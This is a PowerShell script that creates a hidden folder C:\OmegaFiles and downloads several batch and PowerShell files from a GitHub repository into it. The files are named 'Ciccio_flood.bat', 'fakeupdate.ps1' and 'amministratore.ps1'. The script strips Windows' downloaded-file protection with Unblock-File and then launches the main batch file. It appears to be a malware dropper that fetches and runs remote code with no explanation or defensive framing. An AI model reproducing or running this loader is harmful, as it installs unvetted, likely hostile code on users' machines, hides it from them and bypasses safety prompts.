$folder = "C:\OmegaFiles"
New-Item -ItemType Directory -Path $folder -Force | Out-Null

$item = Get-Item $folder
if (-not ($item.Attributes -band [IO.FileAttributes]::Hidden)) {
    $item.Attributes += 'Hidden'
}

$mainUrl = 'https://raw.githubusercontent.com/alpha840x/Omega_Script/main/OMEGAScript.bat'
$mainFile = "$folder\OMEGAScript.bat"
Invoke-WebRequest -Uri $mainUrl -OutFile $mainFile -UseBasicParsing -ErrorAction Stop
Unblock-File $mainFile

$helpers = @(
    @{Url='https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/Ciccio_flood.bat'; Name='Ciccio_flood.bat'},
    @{Url='https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/folder.bat'; Name='folder.bat'}
)
foreach ($h in $helpers) {
    $output = "$folder\$($h.Name)"
    Invoke-WebRequest -Uri $h.Url -OutFile $output -UseBasicParsing -ErrorAction Stop
    Unblock-File $output
}

$psUrl = 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/fakeupdate.ps1'
$psFile = "$folder\fakeupdate.ps1"
Invoke-WebRequest -Uri $psUrl -OutFile $psFile -UseBasicParsing -ErrorAction Stop
Unblock-File $psFile

$psUrl = 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/amministratore.ps1'
$psFile = "$folder\amministratore.ps1"
Invoke-WebRequest -Uri $psUrl -OutFile $psFile -UseBasicParsing -ErrorAction Stop
Unblock-File $psFile

Get-ChildItem -Path $folder -Include *.bat,*.ps1 -File | Unblock-File

if (Test-Path $mainFile) {
    Start-Process $mainFile -WindowStyle Normal
} else {
    Write-Host "ERRORE: $mainFile non trovato" -ForegroundColor Red
}
